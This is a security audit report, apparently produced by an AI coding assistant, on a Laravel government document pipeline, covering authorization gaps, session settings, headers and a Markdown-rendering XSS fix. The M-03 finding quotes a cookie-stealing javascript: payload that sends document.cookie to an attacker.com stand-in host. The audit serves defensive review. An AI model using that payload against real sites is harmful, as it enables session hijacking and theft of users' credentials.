# Security Audit Report — pdf-markdown-pipeline

**Prepared for:** UP State Data Centre (SDC) / NIC Pre-Deployment Review  
**Audit date:** 2026-06-24  
**Remediation date:** 2026-06-24  
**Auditor:** Senior Web Application Security Architect (Claude Code)  
**Stack:** Laravel 13, PHP 8.4, MariaDB 12, Apache, local-first on-premise deployment  
**Scope (Pass 1):** Controllers, Form Requests, Models, Middleware, Blade views, Route configuration  
**Scope (Pass 2):** Login/auth Fortify stack, session configuration, password policy, rate limiting  
**Scope (Pass 3):** M29 Folders (Patravali) module — new controller, Form Requests, models, routes, views (2026-07-04)
**Scope (Pass 4):** M30 Text Extraction & Markdown Conversion Pipeline — new jobs, controller methods, routes, views, Compare & Verify modal (2026-07-13)
**Scope (Pass 5):** M31/M31.1 Policy Taxonomy — `RuleSet.kind` discriminator, department-scoped policy authorization, year-over-year supersession, controlled-vocabulary "other" free text (2026-07-15)

---

## Status Summary

### Pass 1 — Application Layer

| ID | Finding | Severity | Status |
|----|---------|---------|--------|
| H-01 | Bulk force-delete had no audit trail or letter | HIGH | **FIXED** |
| H-02 | Bulk restore was scope-blind (cross-boundary IDOR) | HIGH | **FIXED** |
| M-01 | No security response headers | MEDIUM | **FIXED** |
| M-02 | Archive letters were publicly accessible via storage symlink | MEDIUM | **FIXED** |
| M-02b | Soft-deleted documents were directly accessible via storage URL | MEDIUM | **FIXED (revised M27)** |
| M-03 | Parsedown `javascript:` URI bypass (stored XSS vector) | MEDIUM | **FIXED** |
| L-01 | SVG accepted despite web-accessible storage | LOW | **FIXED** |
| L-02 | `original_filename` stored without sanitization | LOW | **FIXED** |
| L-03 | Department binding silently fell through to `department_level` for unknown aliases | LOW | **FIXED** |
| Rate | Upload rate limit was 60/min (3 GB/min worst-case) | MEDIUM | **FIXED** |

### Pass 2 — Auth / Fortify / Session Stack

| ID | Finding | Severity | Status |
|----|---------|---------|--------|
| A-01 | `FortifyServiceProvider` overwrote the dual-key login rate limiter, killing the per-IP cap | HIGH | **FIXED** |
| A-02 | `Password::defaults()` not configured — Fortify actions used bare min-8 rule | MEDIUM | **FIXED** |
| A-03 | `SESSION_SECURE_COOKIE` missing from `.env` — session cookie transmitted over HTTP | MEDIUM | **FIXED** |
| A-04 | "Remember me" checkbox enabled 5-year persistence, bypassing 120-min session timeout | MEDIUM | **FIXED** |
| A-05 | `SESSION_EXPIRE_ON_CLOSE=false` — session survived browser close on shared workstations | LOW | **FIXED** |
| A-06 | `SESSION_SAME_SITE=lax` — should be `strict` for internal government tool | LOW | **FIXED** |
| A-07 | `SESSION_ENCRYPT=false` — session data stored in plain text in the database | LOW | **FIXED** |
| A-08 | `APP_DEBUG=true` in `.env.example` — no production guidance in the template | LOW | **FIXED** |

| M-02b (revised) | Blanket `.htaccess` block replaced with physical file move on archive | MEDIUM | **FIXED (M27)** |

All findings across Pass 1 and Pass 2 have been remediated.

### Pass 3 — M29 Folders Module (2026-07-04)

| ID | Finding | Severity | Status |
|----|---------|---------|--------|
| H-03 | `UpdateFolderRequest` — `requires_approval` toggle settable by any scoped uploader, not just admin/department.head/section.head | HIGH | **OPEN — deferred, remediation planned** |

H-03 is a newly-introduced authorization bypass, caught during self-review of the M29 branch before merge. **Not yet fixed** — tracked here so it isn't lost; see the detailed finding below for the fix.

### Pass 4 — Text Extraction & Markdown Conversion Pipeline (M30, 2026-07-13)

| ID | Finding | Severity | Status |
|----|---------|---------|--------|
| L-04 | `conversionStatus()` has no visibility/scope check — any authenticated user can poll processing metadata for any document ID | LOW | **OPEN — deferred, remediation planned** |
| — | M-03 (Parsedown `javascript:`/`data:`/`vbscript:` URI strip) re-verified against the new admin-edit path introduced by this pipeline | — | **CONFIRMED STILL EFFECTIVE** |
| — | `RunOcrExtraction` / `ConvertDocumentToMarkdown` subprocess calls | — | **PASS** |
| — | OCR temp files (`storage/app/private/ocr_tmp/`) | — | **PASS** |
| — | Discard/verify state-machine guards | — | **PASS** |

### Pass 5 — Policy Taxonomy Module (M31/M31.1, 2026-07-15)

| ID | Finding | Severity | Status |
|----|---------|---------|--------|
| H-04 | `RuleSetController::create()`/`edit()`/`destroy()` had no authorization check beyond `auth` middleware — any authenticated user could view any department's rule-set/policy forms, and **delete any rule set or policy** (cascading to all its documents) regardless of admin/department-head status | HIGH | **FIXED** |
| H-05 | Same class of bug found codebase-wide on user-triggered follow-up: `DepartmentController`, `SectionController`, `DivisionController`, `FolderController` (`create`/`edit`/`destroy`, both section- and division-scoped folder variants), and `DocumentController`'s five `edit*` review-form methods all had no authorization check beyond `auth` middleware | HIGH | **FIXED** |
| — | Process fix — `claude.md` "Auth & access control" now leads with this exact rule + fix pattern; four dead/unregistered `app/Policies/*.php` stub classes (never wired to Laravel's Gate, misleading dead code) deleted | — | **DOCUMENTED / CLEANED UP** |
| — | Mass-assignment of `policy_status`/`previous_policy_id` (H-03-style bypass via supersession fields) | — | **CONFIRMED NOT EXPLOITABLE** |
| — | `policy_type_other`/`state_other` free-text fields — XSS / stored-script injection | — | **PASS** |
| — | Blade output of new policy fields (`policy_type`, `state`, `effective_start_date`/`effective_end_date`) | — | **PASS (auto-escaped, no `{!! !!}`)** |
| — | Department-scoped policy-type dropdown lock (client-side) re-verified as server-enforced | — | **PASS** |

---

### H-04 · `RuleSetController` create/edit/destroy Had No Authorization Check

**Severity:** HIGH
**Status:** FIXED

**Finding:**
`store()` and `update()` are gated by `StoreRuleSetRequest`/`UpdateRuleSetRequest`, whose
`authorize()` correctly checks `canManagePolicyForDepartment()`/`canManagePolicy()` for
`kind=policy` and `isAdmin()` for `kind=rules`. But `create()` (GET form), `edit()` (GET form),
and — critically — `destroy()` (DELETE) call no `FormRequest` at all; their only route-level
protection was the blanket `['auth', 'throttle:mutations']` middleware, which admits *any*
logged-in user regardless of role. Concretely, before this fix, any authenticated user —
including a plain viewer account with no `department.head` privilege and no admin flag — could:

- `GET /departments/dept/{any-department}/policy/create` and `.../rules/create` for a
  department they have no relationship to (form/data disclosure — low on its own).
- `GET /departments/dept/{any-department}/policy/{rule_set}/edit` for any existing rule set or
  policy, in any department (form/data disclosure).
- `DELETE /departments/dept/{any-department}/policy/{rule_set}` (or the `rules` equivalent) for
  **any** rule set or policy in **any** department — `destroy()` soft-deletes every document
  under that rule set with an audit trail entry, archives their files, then deletes the rule set
  itself. No ownership, department, or role check gated this at all.

This predates the Policy Taxonomy work (`destroy()` has been unguarded since the original Rule
Sets feature, commit `0bf0255`), but Policy Taxonomy raised the stakes: it put a department's
*named legal policy documents* (UP Excise Policy, Cane Policy, ...) behind the exact same
unguarded `destroy()` route as internal rule sets, and made `create()`/`edit()` reachable for
every department "existing or future" per the route comment — so the blast radius of the
pre-existing gap grew with this module rather than shrinking it. Caught during this pass's
review specifically because Pass 5 asked "does the new Policy authorization surface actually get
enforced everywhere it's supposed to," not just in the two `FormRequest`s that were written for
it.

**Fix:** added a private `authorizeManage(Department $department, string $kind, ?RuleSet
$ruleSet = null)` helper to `RuleSetController` that mirrors the exact same authorize() logic as
the two `FormRequest`s (`canManagePolicy()`/`canManagePolicyForDepartment()` for `kind=policy`,
`isAdmin()` for `kind=rules`), called as the first line of `create()`, `edit()`, and `destroy()`
— `abort_unless(..., 403)` before any view render or any database mutation.

**Verification:** exercised directly via `php artisan tinker` against real `User` records (no
data mutated — used an in-memory, unsaved `RuleSet` instance to avoid touching the database) —
confirmed a non-admin user with no relationship to the target department gets `HTTP 403` calling
`edit()`, and an admin user is still allowed through. `destroy()`'s guard was not exercised live
(any real invocation would be destructive against real data), but is structurally identical —
same helper, same call-first-line placement, verified by code review that it runs before the
`DB::transaction()` in every case.

**Files affected:** `app/Http/Controllers/RuleSetController.php`

---

### H-05 · Same Authorization Gap, Found Codebase-Wide

**Severity:** HIGH
**Status:** FIXED

**Finding:**
After fixing H-04, the user asked directly: "the auth flaw was likely oversighted, can you confirm
no other parts have this flaw." Correct instinct — H-04 was one instance of a repeated pattern
across every controller managing an organisational container (Department → Section → Division →
Folder) plus `DocumentController`'s per-context edit forms, not a one-off in `RuleSetController`.
Every one of these controllers follows the same shape: `store()`/`update()` are properly gated via
a `FormRequest`'s `authorize()`, but `create()` (GET), `edit()` (GET), and `destroy()` (DELETE) —
which don't take a `FormRequest` parameter — had **no authorization check at all**, protected only
by the route group's blanket `['auth', 'throttle:mutations']` middleware. Confirmed by reading
every controller's method list and checking for a constructor, middleware call, or inline
`abort`/`authorize` — found none in `DepartmentController`, `SectionController`,
`DivisionController`, `FolderController`, or the affected `DocumentController` methods before this
fix. Concretely, before this fix, any authenticated user regardless of role could:

- **Delete any department** (`DepartmentController::destroy()`) — cascades to every section,
  division, folder, rule set, and document beneath it via model relations/soft-deletes.
- **Delete any section** (`SectionController::destroy()`).
- **Delete any internal division** (`DivisionController::destroy()`) — soft-deletes every document
  in it with an audit entry first, same as the RuleSet/Folder pattern.
- **Delete any folder**, section- or division-scoped (`FolderController::destroy()`/
  `destroyForDivision()`) — same cascade-and-archive pattern.
- View the `create`/`edit` forms for any of the above regardless of department/section/division
  assignment (form/data disclosure).
- View the review/edit form for **any document** via `DocumentController::edit()` and its four
  `edit*Doc()` siblings (`editRuleSetDoc`, `editDivisionDoc`, `editSectionFolderDoc`,
  `editDivisionFolderDoc`) — lower severity than the `destroy()` findings since the corresponding
  `update()`/`destroy()` mutations were already correctly gated via `UpdateDocumentRequest`/
  `DeleteDocumentRequest`, but still a metadata/content disclosure gap for documents outside a
  viewer's normal scope (e.g. `pending_approval`, `authenticated`-visibility, or a different
  department's document).

**Why this happened:** every one of these controllers was written with the *intent* that
authorization lives in the paired `FormRequest`, and that pattern **does** work correctly for
`store()`/`update()`. But `create()`/`edit()`/`destroy()` don't naturally take a `FormRequest` (no
validation to run), so the same author, working from the same mental model each time, never added
an equivalent check to those three methods — a systemic blind spot in how this codebase's
authorization convention was applied, not an isolated mistake in one file. The RuleSet version
(H-04) was caught first only because it was the most recently touched controller in this session's
scope; the same review pattern applied to the rest of the codebase surfaced the identical gap five
more times.

**Fix:** the same pattern used for H-04 — a private `authorizeManage()` (or `authorizeEdit()` on
`DocumentController`) helper per controller, mirroring that controller's own paired `FormRequest`
`authorize()` logic exactly, called as the first line of every previously-unguarded method:

| Controller | Helper mirrors | Applied to |
|---|---|---|
| `DepartmentController` | `Store`/`UpdateDepartmentRequest`: `isAdmin() \|\| hasPrivilege('organization.head')` | `create()`, `edit()`, `destroy()` |
| `SectionController` | `Store`/`UpdateSectionRequest`: `isAdmin() \|\| (department.head && department_id match)` | `create()`, `edit()`, `destroy()` |
| `DivisionController` | `Store`/`UpdateDivisionRequest`: `isAdmin() \|\| (section.head && section_id match) \|\| (department.head && department_id match)` | `create()`, `edit()`, `destroy()` |
| `FolderController` | `Store`/`UpdateFolderRequest`: `canUploadTo(division ?? section)` | `create()`, `edit()`, `destroy()`, `createForDivision()`, `editForDivision()`, `destroyForDivision()` |
| `DocumentController` | `UpdateDocumentRequest`: `isAdmin() \|\| (ruleSet.kind === 'policy' && canManagePolicy(ruleSet))` | `edit()`, `editRuleSetDoc()`, `editDivisionDoc()`, `editSectionFolderDoc()`, `editDivisionFolderDoc()` |

`RuleSetController` (H-04) already covered `kind=rules`/`kind=policy` the same way.

**Verification:** exercised `Department::edit()` and `Section::edit()` live via `php artisan
tinker` against real `User`/`Department`/`Section` records (read-only calls, no mutation) — a
non-admin user unrelated to the target got `HTTP 403` on both, an admin was let through on both.
`Division`/`Folder`/`Document` fixtures didn't exist in the local dev database to exercise live,
so those were verified by code review only: identical helper pattern, identical
call-before-anything-else placement, logic transcribed directly from the corresponding
`FormRequest::authorize()` with no behavioral drift. `destroy()` methods were not exercised live on
any controller (any real invocation would delete real data) for the same reason as H-04.

**Files affected:** `app/Http/Controllers/DepartmentController.php`,
`app/Http/Controllers/SectionController.php`, `app/Http/Controllers/DivisionController.php`,
`app/Http/Controllers/FolderController.php`, `app/Http/Controllers/DocumentController.php`

---

### Process Fix — Preventing H-04/H-05 From Recurring

**Status:** DOCUMENTED, dead code removed; no automated regression test added (see "Not done" below)

H-04/H-05 is not really six separate bugs — it's one systemic gap (authorization living
exclusively in `FormRequest::authorize()`, which silently doesn't apply to methods that don't take
a `FormRequest`) that got copy-pasted across every controller written to that convention. Fixing
the six instances doesn't prevent a seventh the next time a controller is added. Three things were
done to actually close the door on repetition, not just patch the current holes:

1. **Made the rule explicit and unmissable in `claude.md`** (`### Auth & access control`, first
   bullet) — spelled out exactly why `middleware('auth')` doesn't imply per-record authorization,
   gave the concrete fix pattern (`authorizeManage()`/`authorizeEdit()` helper, called first-line),
   and named this exact incident as the cautionary example. `claude.md` is the document every future
   development session (human or AI) reads before touching this codebase — this is the most direct
   lever available for "make sure this doesn't happen again."

2. **Deleted four dead, misleading `app/Policies/*.php` stub classes** (`DocumentPolicy`,
   `DepartmentPolicy`, `SectionPolicy`, `RuleSetPolicy`) — all four were `php artisan make:policy`
   boilerplate that returned `false` unconditionally, were never registered with `Gate::policy()`
   or auto-discovered, and were never called anywhere (`grep` confirmed zero references outside
   their own files). Leaving them in place was actively dangerous: a future developer skimming
   `app/Policies/` could reasonably assume Laravel's Policy/Gate mechanism was the authorization
   system in use here, when in fact every real check lives in hand-written `FormRequest::authorize()`
   methods and (as of this fix) controller-level helpers. Half-wired authorization scaffolding that
   *looks* like it's doing something is worse than no scaffolding at all, because it invites false
   confidence instead of prompting the "wait, is this actually checked?" question that would have
   caught H-04/H-05 sooner.

3. **Not done, flagged instead of silently skipped:** an automated regression test (e.g. a Pest
   Feature test that walks every management route as a low-privilege user and asserts `403`) would
   be the strongest possible guard — documentation can be skipped, a failing CI check cannot. Not
   added in this pass because the test infrastructure is currently unconfigured for it:
   `tests/Pest.php` has `RefreshDatabase` commented out, and `database/factories/{Department,
   Section,RuleSet}Factory.php` are all empty `make:factory` stubs with no `definition()` fields —
   building this properly means standing up the project's test database wiring from scratch, which
   is a larger, separate piece of work than this fix. Recommended as the next concrete step if this
   class of bug needs a stronger guarantee than "the docs say so."

---

### Mass-Assignment of `policy_status`/`previous_policy_id` — Re-Verified, Not Exploitable

**Status:** CONFIRMED NOT EXPLOITABLE

Both fields are listed in `RuleSet::$fillable`, which on its own would be a classic
H-03-style mass-assignment bypass (the same class of bug as the Pass 3 Folders finding) if user
input ever reached them. Checked both write paths:

- `store()` builds the new record from `$request->validated()` (never `$request->all()`), and
  neither field appears in `StoreRuleSetRequest::rules()` — Laravel's `validated()` only returns
  keys declared in `rules()`, so no client-supplied value for either field can reach `create()`
  no matter what a raw POST body contains.
- `update()` uses `$request->validated()` the same way; `UpdateRuleSetRequest::rules()` also
  excludes both fields (this exclusion was already called out as deliberate in that file's own
  doc comment, referencing H-03).
- The only two places either field is ever written are inside `RuleSetController::store()`'s
  `DB::transaction()` — `$previousCurrent->update(['policy_status' => 'superseded'])` and
  `$newRuleSet->update(['previous_policy_id' => $previousCurrent->id])` — both hardcoded
  server-side values, never derived from request input.

**No fix needed** — the fillable listing is necessary for these two internal `update()` calls to
work at all; the actual protection is that no user-facing validation path ever exposes the keys.

---

### Free-Text "Other" Fields (`policy_type_other`, `state_other`) — XSS Check

**Status:** PASS

Both fields accept arbitrary user text (e.g. a manually-typed "Import Policy") and are rendered
back in `rule_sets/show.blade.php`, `rule_sets/edit.blade.php`, and `department/show.blade.php`.
Confirmed: (1) `prepareForValidation()` in both Form Requests runs `strip_tags(trim(...))` before
the value ever reaches `Str::title()` or the database — HTML tags are stripped, not escaped, so a
literal `<script>` submission is reduced to inert text before storage; (2) the `regex`
Unicode-text validation rule (`/^[\p{L}\p{M}\p{N}\p{P}\p{Z}\s]+$/u`) additionally rejects control
characters and most non-text bytes; (3) every Blade template in `resources/views/rule_sets/`
outputs these fields exclusively via `{{ }}` (auto-escaped) — grepped the directory for `{!! !!}`
and found none. Defense in depth: sanitized at write time *and* escaped at render time.

---

### L-04 · `conversionStatus()` Unscoped Across Visibility/Department Boundaries

**Severity:** LOW
**Status:** OPEN — not yet fixed, remediation planned

**Finding:**
`GET /documents/{id}/convert-status` → `DocumentController::conversionStatus()` takes only a
numeric ID, resolves the document with `Document::findOrFail($id)`, and returns
`status`/`extraction_method`/`needs_ocr_review`/`has_markdown` with no authorization check
beyond the route's blanket `auth` middleware. Every other document-scoped route in this
codebase enforces one of: guest visibility (`visibility === 'public'`), organisational
upload/delete scope, or an explicit `isAdmin()` gate. This endpoint enforces none of them — any
authenticated user (viewer, operator, admin, regardless of department/section/division
assignment) can poll the conversion status of any document ID, including documents whose
`visibility = 'authenticated'` sits outside their normal browsing scope, or documents in
`pending_approval`/`rejected` state that `->publishable()` deliberately hides from every other
authenticated view.

**Impact is limited but real:** this leaks only processing metadata, never document title,
content, or file bytes — an attacker enumerating IDs learns "document 47 exists, is in
`review`, extracted via OCR" but nothing else. Still, it's a metadata side-channel that every
comparable endpoint in this codebase closes, and it could confirm the existence of a document
someone shouldn't know about yet (e.g. a `pending_approval` upload mid maker-checker review).

**Why not fixed in this pass:** the polling call is only ever made client-side for a document
the user is already looking at (the Pipeline monitor page, or the page-level convert banner on
`documents/show`) — there's no live exploit path demonstrated, just a missing scope check
relative to this codebase's own pattern. Flagged rather than patched blind, since the correct
scope for this specific endpoint needs a decision: should it follow guest-visibility rules
(like `show()`), organisational scope (like `canDeleteFrom()`), or just "authenticated,
unscoped" is actually fine because it's metadata-only? Left open for that decision rather than
guessing.

**Planned fix (one option, not yet applied):** add the same visibility check `show()` uses —

```php
if (! auth()->user()->isAdmin() && $document->visibility !== 'public') {
    // resolve context and check organisational scope, mirroring canDeleteFrom()
}
```

**Files affected:** `app/Http/Controllers/DocumentController.php` (`conversionStatus()`)

---

### M-03 Re-Verification — Parsedown XSS Strip Still Effective Under the New Edit Path

**Status:** CONFIRMED STILL EFFECTIVE, no regression

M-03 (see below) was fixed for the read-only markdown card before this pipeline existed. This
pipeline adds a genuinely new capability that M-03's original threat model didn't anticipate:
an admin can now **edit** the Markdown content directly (Compare & Verify modal → `PATCH
/documents/{id}/markdown` → `updateMarkdown()`) and have that edited content persisted back to
`markdown_path` and re-rendered. Re-checked whether the strip still applies to admin-edited
content, not just extractor output:

`resources/views/documents/show.blade.php` computes `$mdHtml` by reading `$document->
markdown_path` fresh at render time and running it through the same `Parsedown::setSafeMode(true)`
+ `preg_replace('/\b(href|src)\s*=\s*(["\'])(?:javascript|data|vbscript):[^"\']*\2/i', ...)`
pipeline regardless of whether the file's content came from `markitdown`, Tesseract, or a
manual admin edit — the sanitization happens at **render time** on whatever bytes are in the
file, not at write time keyed to content origin. **No gap found.** `UpdateDocumentMarkdownRequest`
also caps content at `max:2000000` characters, and is gated `isAdmin()` in
`authorize()` — the only actor who can write to `markdown_path` via this new path is already
trusted at the same level as Edit/Delete/Convert throughout this codebase.

---

### Subprocess Invocation — `ConvertDocumentToMarkdown` / `RunOcrExtraction`

**Status:** PASS

Both jobs shell out via Laravel's `Process` facade (`symfony/process`) using **array-form
arguments** exclusively — `Process::run(['pdftoppm', '-png', '-r', '300', $absolutePdfPath,
"{$tmpDir}/page"])`, `Process::run(['tesseract', $imagePath, $outputBase, '-l', 'hin+eng',
'hocr'])`, `Process::run([$this->pythonBin, $this->extractorScript, '--mode', 'pdf',
$absolutePdfPath])`. Array form passes each argument directly to `execve()` without a shell
intermediary, so there is no shell-metacharacter injection surface even though `$absolutePdfPath`
is derived from a server-generated vault path (not raw user input, but would be safe either way
under this calling convention). No string-interpolated shell commands anywhere in either job.

---

### OCR Temp Files — Private Disk, Cleaned Up

**Status:** PASS

`RunOcrExtraction::runOcr()` rasterizes pages into `storage_path('app/private/ocr_tmp/' .
uniqid('doc_', true))` — under the `local` (private) disk root, never the `public`/symlinked
disk, so intermediate page images are never web-accessible even transiently. A `finally` block
unlinks every file and removes the directory regardless of success or exception, so a crashed
OCR run doesn't leave scanned page images sitting on disk indefinitely.

---

### Discard / Verify State-Machine Guards

**Status:** PASS

`discardMarkdown()` returns 422 once `status === 'verified'` — an already-accepted, audited
record cannot be reset to `uploaded` and have its Markdown deleted through this endpoint, which
would otherwise be a way to quietly erase an accepted extraction without going through the
Archive (soft-delete + reason + audit trail) flow this codebase uses everywhere else for
destructive actions. `updateMarkdown()`'s `verify` flag only transitions `status` forward
(`review → verified`), never backward, and always writes a `DocumentStatusHistory` row when it
does.

---

### Informational — Not a Security Finding: Bulk-Upload Auto-Convert Silent No-Op

Noted here for completeness since it touches the same authorization boundary as L-04, but this
is a **functional** gap, not a vulnerability — it fails closed, not open. The Bulk Upload page's
"auto-convert" checkbox is offered to any user with upload scope, but `convert()` is gated
`isAdmin()`. For a non-admin uploader, the auto-convert `fetch()` call 403s and is silently
swallowed by a `.catch()` that only logs to the browser console — no security impact (nothing
unauthorized happens), but the UI gives no indication that conversion never started. Tracked in
`CLAUDE.md` and `summary.md` (M30) as a known UX gap, not tracked here as a security item.

---

## Detailed Findings & Mitigations

---

### H-01 · Bulk Force-Delete Had No Audit Trail or Letter Requirement

**Severity:** HIGH  
**Status:** FIXED

**Vulnerability:**  
`bulkForceDestroy()` permanently deleted up to 100 documents in a single request with zero audit evidence — no reason captured, no `DocumentStatusHistory` rows written, no authorisation letter. The individual `forceDestroy()` correctly required a reason, a letter PDF, and wrote a history row. The bulk path had none of these.

**Attack / Compliance Impact:**  
A government document archive could be silently wiped via a single authenticated DELETE request with `{"ids": [1,2,3,...]}`. Violated IT Act 2000 Section 76 (preservation of electronic records).

**Fix applied:**

1. `BulkForceDestroyDocumentsRequest` — added `reason` field (`required|string|min:5|max:500`) with `prepareForValidation()` sanitation. Updated `authorize()` from `isAdmin()` to `hasPrivilege('documents.force-delete')` for consistency with the single-delete gate.

2. `DocumentController@bulkForceDestroy` — inside the loop, creates a `DocumentStatusHistory` row per document (`to_status = 'force_deleted'`, `note = $reason`) **before** `forceDelete()` executes.

3. `trash.blade.php` — the bulk "Delete Forever" button now shows a two-step Swal2 flow: first a textarea prompt (min 5 chars, validated client-side), then a final confirmation. The collected reason is injected as a hidden `<input name="reason">` before the form submits.

**Files changed:**  
`app/Http/Requests/BulkForceDestroyDocumentsRequest.php` · `app/Http/Controllers/DocumentController.php` · `resources/views/documents/trash.blade.php`

---

### H-02 · Bulk Restore Was Scope-Blind (Cross-Boundary IDOR)

**Severity:** HIGH  
**Status:** FIXED

**Vulnerability:**  
`BulkRestoreDocumentsRequest::authorize()` only checked `$this->user() !== null`. The controller checked `hasPrivilege('documents.restore')` (a privilege check), but the loop that restored documents performed **no per-document scope check**. A division-scoped operator with `documents.restore` could POST arbitrary trashed document IDs and restore documents from any other department.

**Fix applied:**

Inside `bulkRestore()`, added a per-document scope check before `$document->restore()`:

```php
if (! $authUser->isAdmin()) {
    $context = $document->division ?? $document->section ?? $document->ruleSet;
    if ($context && ! $authUser->canDeleteFrom($context)) {
        continue; // silently skip out-of-scope documents
    }
}
```

Admins bypass unconditionally. Non-admin users can only restore documents within their assigned scope, matching the behaviour of single-document restore and all other mutating operations.

**Files changed:**  
`app/Http/Controllers/DocumentController.php`

---

### M-01 · No Security Response Headers

**Severity:** MEDIUM  
**Status:** FIXED

**Vulnerability:**  
Zero security response headers were set. NIC / STQC mandate `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, `Referrer-Policy`, and `Permissions-Policy` on all government web applications.

**Fix applied:**

Created `app/Http/Middleware/SecurityHeaders.php` and registered it globally via `$middleware->append(...)` in `bootstrap/app.php` so every response — including error pages — carries these headers:

| Header | Value |
|--------|-------|
| `X-Frame-Options` | `SAMEORIGIN` |
| `X-Content-Type-Options` | `nosniff` |
| `Referrer-Policy` | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=(), usb=()` |
| `Content-Security-Policy` | `default-src 'self'; script-src 'self' 'unsafe-inline' cdn.tailwindcss.com cdn.jsdelivr.net; ...` (see middleware for full policy) |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` (HTTPS only — not sent over plain HTTP to avoid breaking local dev) |

**Note on `unsafe-inline`:** Tailwind Play CDN and the inline `<script>` blocks throughout the Blade views require `unsafe-inline`. This is acceptable for the current architecture. When the project migrates off the Play CDN to a compiled Tailwind build, replace `unsafe-inline` with explicit nonces or hashes for a stricter policy.

**Files changed:**  
`app/Http/Middleware/SecurityHeaders.php` (new) · `bootstrap/app.php`

---

### M-02 · Archive Letters and Archived Documents Were Publicly Accessible

**Severity:** MEDIUM  
**Status:** FIXED — two separate sub-issues addressed

#### M-02a · Archive Letters on Public Disk

**Vulnerability:**  
Authorisation letters uploaded during permanent deletion were stored on the `public` disk via `Storage::disk('public')->putFileAs('', ...)`. The `public` disk is symlinked to `public/storage/`. Any letter was directly accessible at `https://server/storage/archive_letters/{sequential_id}_{timestamp}.pdf` — no authentication required.

**Fix applied:**  
Changed to `Storage::disk('local')` (the private disk at `storage/app/private/`, no symlink):

```php
// Before
Storage::disk('public')->putFileAs('', $letterFile, $letterFilename);

// After
Storage::disk('local')->putFileAs('archive_letters', $letterFile, $letterBasename);
$letterPath = 'archive_letters/' . $letterBasename;
```

Rollback on transaction failure updated to use `Storage::disk('local')->delete(...)` as well.

**Note:** Archive letters are now stored at `storage/app/private/archive_letters/`. They are not web-accessible by any URL. If an admin needs to retrieve a specific letter, access is via the filesystem directly (or add a dedicated admin-only download route in a future iteration).

#### M-02b · Archived Documents Moved to Private Disk on Soft-Delete

**Vulnerability:**  
Soft-deleted (archived) documents remained on the `public` disk at their original vault path. Because `public/storage/` is a symlink to that disk, anyone who knew or guessed the storage URL (e.g. `https://server/storage/document_vault/.../file.pdf`) could retrieve them directly — bypassing the application's soft-delete check entirely.

**Initial fix (M24):** Blanket `.htaccess` 403 rule blocking all of `/storage/document_vault/`.

**Revised fix (M27):** The blanket block was removed because it also prevented direct URL sharing and search-engine indexing of **active** public documents — an intentional feature of the vault. The correct fix is at the file layer: when a document is soft-deleted, its files are **physically moved** from the `public` disk to the private `local` disk (`storage/app/private/archived_documents/{id}.pdf`). When restored, files are moved back. This way:

| Document state | File location | Web-accessible |
|---|---|---|
| Active, `visibility=public` | `public` disk → `/storage/document_vault/…` | ✓ Yes — by design |
| Active, `visibility=authenticated` | `public` disk | URL not published; controller enforces auth |
| Archived (soft-deleted) | `local` disk → `storage/app/private/archived_documents/` | ✗ Never |

**`ManagesDocumentFiles` trait** (`app/Http/Controllers/Concerns/ManagesDocumentFiles.php`) provides three methods used by `DocumentController` and `RuleSetController`:
- `archiveFiles(Document)` — moves PDF + Markdown to private disk after soft-delete
- `restoreFiles(Document)` — moves files back to public disk vault path after restore
- `deleteArchivedFiles(Document)` — deletes from private disk on permanent deletion

File moves happen **after** the DB transaction so a failed file move never prevents the database state from committing. Failures are logged as warnings (non-fatal) — the document's archived/restored state is determined by `deleted_at`, not file location.

**`.htaccess` change:** The `document_vault` block is removed. The `archive_letters` block is retained as a defence-in-depth fallback only.

**Files changed:**  
`app/Http/Controllers/Concerns/ManagesDocumentFiles.php` (new) · `app/Http/Controllers/DocumentController.php` · `app/Http/Controllers/RuleSetController.php` · `public/.htaccess`

---

### M-03 · Parsedown `javascript:` URI Bypass (Stored XSS)

**Severity:** MEDIUM  
**Status:** FIXED

**Vulnerability:**  
Extracted Markdown content was rendered with:

```php
{!! \Parsedown::instance()->setSafeMode(true)->text($markdown) !!}
```

`Parsedown::setSafeMode(true)` (package `erusev/parsedown ^1.0`) strips raw `<script>` blocks but does **not** sanitize `javascript:`, `data:`, or `vbscript:` URI schemes in `href` and `src` attributes. The `{!! !!}` syntax bypasses Blade's auto-escaping, so the output is injected verbatim.

**Attack chain:** A crafted Word document or SVG (now blocked — see L-01) containing a URL like `[Circular](javascript:document.location='https://attacker.com/?c='+document.cookie)` → `markitdown` extracts it as Markdown → Parsedown renders it as an `<a href="javascript:...">` → admin opening the review page executes the payload.

**Fix applied:**  
After Parsedown renders the HTML, a `preg_replace` strips any `href` or `src` attribute whose value begins with `javascript:`, `data:`, or `vbscript:`, replacing it with `href="#"`:

```php
$mdHtml = preg_replace(
    '/\b(href|src)\s*=\s*(["\'])(?:javascript|data|vbscript):[^"\']*\2/i',
    '$1=$2#$2',
    $mdHtml
);
```

This is a defence-in-depth layer. No new Composer dependency is introduced. For an even stricter fix, `ezyang/htmlpurifier` with `URI.AllowedSchemes = ['http', 'https', 'mailto']` can be added later.

**Files changed:**  
`resources/views/documents/show.blade.php`

---

### L-01 · SVG Accepted Despite Web-Accessible Storage

**Severity:** LOW → removed attack surface  
**Status:** FIXED

**Vulnerability:**  
`image/svg+xml` was in `StoreDocumentRequest::ACCEPTED_MIMETYPES`. SVG is XML and can contain `<script>` tags and event handlers. Even with the forced `.pdf` storage extension (which partially mitigated browser execution), accepting SVG was an unnecessary attack surface that enabled the M-03 chain via `markitdown` text extraction.

**Fix applied:**  
Removed `image/svg+xml` from `ACCEPTED_MIMETYPES`. The error message updated to explicitly state "SVG files are not permitted." No government or general document workflow requires SVG uploads.

**Files changed:**  
`app/Http/Requests/StoreDocumentRequest.php`

---

### L-02 · `original_filename` Stored Without Sanitization

**Severity:** LOW  
**Status:** FIXED

**Vulnerability:**  
`$request->file('file')->getClientOriginalName()` was stored as-is in the `original_filename` column and later used in `Content-Disposition: inline; filename="..."` response headers. A filename containing embedded double-quotes could theoretically escape the header attribute value. While Symfony's `HeaderBag` strips CR/LF characters (blocking the most dangerous injection), unescaped quotes are RFC non-compliant.

**Fix applied:**  
Filename sanitized before storage using a permissive allowlist that preserves readable names:

```php
preg_replace('/[^\w\s\-\.\(\)]/', '_', $request->file('file')->getClientOriginalName())
```

